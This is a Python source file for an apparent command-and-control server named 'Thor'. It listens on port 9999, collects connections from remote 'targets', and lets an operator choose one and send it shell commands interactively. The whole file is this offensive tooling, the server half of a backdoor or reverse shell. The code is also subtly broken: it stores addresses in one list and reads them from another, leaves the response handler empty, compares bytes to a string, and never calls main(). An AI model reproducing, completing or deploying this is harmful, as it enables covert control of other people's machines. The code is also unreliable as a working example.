from CONST import COMMANDS, NUM_OF_THREADS, NUM_OF_JOBS
import threading
import signal
import socket
from queue import Queue
import logging
import sys
import time


queue = Queue()

class Thor():

    def __init__(self):
        self.host = ''
        self.port = 9999
        self.socket = None
        self.all_connections = []
        self.all_ip_addresses = []

    def help(self):
        """
        help function
        """
        for cmd, description in COMMANDS.items():
            print(f'{cmd}:\t{description}')

    def socket_create(self):
        try:
            self.socket = socket.socket()
        except socket.error as msg:
            print(f'Socket creation error: {str(msg)}')
            logging.error(f'Socket creation error: {str(msg)}')
            sys.exit(1)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def socket_bind(self):
        """
        Bind socket to port & wait for connection from target
        """
        try:
            self.socket.bind((self.host, self.port))
            self.socket.listen(5)
        except socket.error as msg:
            print(f'Socket binding error: {str(msg)}')
            logging.error(f'Socket binding error: {str(msg)}')
            time.sleep(5)
            self.socket_bind()

    def accept_connections(self):
        """ Accept connections from multiple clients and append to list """
        for connection in self.all_connections:
            connection.close()
        self.all_connections = []
        self.all_addresses = []
        while True:
            try:
                conn, address = self.socket.accept()
                conn.setblocking(1)
                client_hostname = conn.recv(1024).decode("utf-8")
                address = address + (client_hostname,)
            except Exception as e:
                print('Error accepting connections: %s' % str(e))
                # Loop indefinitely
                continue
            self.all_connections.append(conn)
            self.all_addresses.append(address)
            print(f'\nConnection has been established: {address[-1]} ({address[0]})')

    # def register_signal_handler(self):
    #     signal.signal(signal.SIGINT, self.quit_gracefully)
    #     signal.signal(signal.SIGTERM, self.quit_gracefully)


    def handle_command(self):
        """
        Interactive prompt for sending commands remotely
        """
        while True:
            cmd = input('> ')
            if cmd == 'clients':
                self.show_targets()
            elif 'client' in cmd:
                try:
                    target_id = int(cmd.split(' ')[-1])
                    target_id, connection = self.connect_to_target(target_id)
                    if connection is not None:
                        self.send_target_commands(target_id, connection)
                except ValueError:
                    print('Enter a valid index (integer)')


    def show_targets(self):
        """
        Show all targets available
        """
        print('ID\t-\tClient Addresses')
        for i, client in enumerate(self.all_ip_addresses):
            print(f'{i}\t-\t{client}')

    def connect_to_target(self, id):
        try:
            connection = self.all_connections[id]
        except IndexError:
            print('Not a valid selection')
            return None, None
        print(f'Connected to {self.all_ip_addresses[id]}')
        logging.info(f'Connected to {self.all_ip_addresses[id]}')
        return id, connection

    def send_target_commands(self, id, connection):
        """
        Send commands to target
        :param id:
        :param connection:
        """
        while True:
            try:
                cmd = str.encode(input('> '))
                if len(cmd) > 0:
                    connection.send(cmd)
                    response = self.get_response_from_target(connection)
                    print(str(response))
                if cmd == 'quit':
                    break
            except Exception as e:
                print(f'Connection lost {str(e)}')
                logging.error(f'Connection lost - {self.all_ip_addresses[id]}')
                break
        del self.all_connections[id]
        del self.all_ip_addresses[id]

    def get_response_from_target(self, connection):
        pass

def create_workers():
    """
    Create workers threads
    """
    server = Thor()
    for _ in range(NUM_OF_THREADS):
        t = threading.Thread(target=work, args=(server,))
        t.daemon = True
        t.start()

def work(server):
    """
    Do the next job in queue
    (thread for handling connections, thread for sending commands)
    :param server:
    """
    while True:
        job_number = queue.get()
        if job_number == 1:
            server.socket_create()
            server.socket_bind()
            server.accept_connections()
        if job_number == 2:
            server.handle_command()
        queue.task_done()

def create_jobs():
    """
    Each list item is a new job
    """
    for job_number in NUM_OF_JOBS:
        queue.put(job_number)
    queue.join()

def main():
    logging.basicConfig(filename='Thor_logs.log',
                        format='%(asctime)s [%(levelname)s] %(message)s',
                        level=logging.INFO)
    create_workers()
    create_jobs()